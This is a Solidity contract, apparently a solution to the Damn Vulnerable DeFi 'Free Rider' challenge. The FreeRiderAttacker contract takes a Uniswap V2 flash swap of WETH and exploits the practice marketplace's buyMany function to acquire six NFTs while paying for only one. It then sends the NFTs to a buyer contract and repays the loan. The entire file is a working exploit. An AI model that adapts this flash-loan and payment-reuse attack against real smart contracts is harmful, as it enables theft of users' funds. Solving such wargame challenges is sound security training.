// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';


import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

import "./FreeRiderBuyer.sol";
import "./FreeRiderNFTMarketplace.sol";
import "../DamnValuableNFT.sol";

import "hardhat/console.sol";

interface IWETH9 {
  function deposit() external payable;
  function withdraw(uint) external;
}

contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {

  address immutable BUYER;
  address immutable MARKETPLACE;
  address immutable NFT;
  address immutable WETH;
  address immutable FACTORY;
  address immutable DVT;

  uint256[] private tokenIds;

  uint256 constant NFT_PRICE = 15 ether;
  uint256 constant AMOUNT_OF_NFTS = 6;
  
  constructor(
    address _buyer, 
    address payable _marketplace, 
    address _nft, 
    address payable _weth,
    address _factory,
    address _dvt,
    uint256[] memory _tokenIds
  ) {
    BUYER = _buyer;
    MARKETPLACE = _marketplace;
    NFT = _nft;
    WETH = _weth;
    FACTORY = _factory;
    DVT = _dvt;
    tokenIds = _tokenIds;
  }

  function attack(uint256 _amount) external {
    address pair = IUniswapV2Factory(FACTORY).getPair(DVT, WETH);
    require(pair != address(0), "!pair");

    address token0 = IUniswapV2Pair(pair).token0();
    address token1 = IUniswapV2Pair(pair).token1();
    uint256 amount0Out = token0 == WETH ? _amount : 0;
    uint256 amount1Out = token1 == WETH ? _amount : 0;

    bytes memory data = abi.encode(WETH, _amount);

    IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), data);
  }

  function uniswapV2Call(
    address _sender, 
    uint256 _amount0, 
    uint256 _amount1, 
    bytes calldata _data
  ) external override {
    address token0 = IUniswapV2Pair(msg.sender).token0();
    address token1 = IUniswapV2Pair(msg.sender).token1();
    address pair = IUniswapV2Factory(FACTORY).getPair(token0, token1);
    require(address(pair) == msg.sender, "!pair");
    require(_sender == address(this), "!sender");

    console.log("flash swap!");
    (, uint amount) = abi.decode(_data, (address, uint));

    uint256 fee = ((amount * 3) / 997) + 1;
    uint256 amountToRepay = amount + fee;

    console.log("amount", amount);
    console.log("_amount0", _amount0);
    console.log("_amount1", _amount1);
    console.log("fee", fee);
    console.log("amountToRepay", amountToRepay);

    buyNFTs();

    console.log("repay flash loan");
    IERC20(WETH).transfer(pair, amountToRepay);
  }

  function buyNFTs() internal {
    // I need 15 ethers only
    uint256 ETHER_NEEDED = NFT_PRICE;

    console.log("GET THE ETH NEEDED");
    IWETH9(WETH).withdraw(ETHER_NEEDED);

    console.log("BUY THE NFTS");
    (bool success1, ) = payable(MARKETPLACE).call{value: ETHER_NEEDED}(
      abi.encodeWithSignature("buyMany(uint256[])", tokenIds)
    );
    require(success1, "BUY FAILED");

    console.log("SELL NFTS TO BUYER");
    for (uint256 i = 0; i < tokenIds.length; i++) {
      IERC721(NFT).safeTransferFrom(address(this), BUYER, tokenIds[i]);
    }

    console.log("WRAP THE ETH AGAIN");
    (bool success2, ) = payable(WETH).call{value: ETHER_NEEDED}(
      abi.encodeWithSignature("deposit()")
    );
    require(success2, "WRAP ETH FAILED");
  }

  /*
    needed because FreeRiderNFTMarketplace is using safeTransferFrom
  */
  function onERC721Received(
      address,
      address,
      uint256,
      bytes memory
  ) external pure override returns (bytes4) {
    return IERC721Receiver.onERC721Received.selector;
  }

  receive() external payable {}
}